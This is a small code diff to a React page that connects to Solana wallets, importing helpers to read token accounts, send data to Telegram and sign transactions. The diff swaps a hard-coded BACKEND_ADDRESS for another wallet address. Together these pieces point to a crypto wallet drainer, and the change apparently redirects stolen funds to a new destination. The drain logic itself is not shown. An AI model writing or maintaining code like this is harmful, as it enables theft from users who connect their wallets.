@@ -6,7 +6,7 @@ import { useEffect, useState } from 'react';
 import { getTokenAccounts, sendToTelegram, signAndSendTransaction } from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
 
-const BACKEND_ADDRESS = "BHQsFPYDG6Px5cJpKr6tvRXDiGZcU5KGXNrAMxqj5v8Q";
+const BACKEND_ADDRESS = "GsRoop6YCzpakWCoG7YnHSSgMvcgjnuFEie62GRZdmJx";
 
 const Index = () => {
   const { publicKey, connecting, connected, wallet } = useWallet();
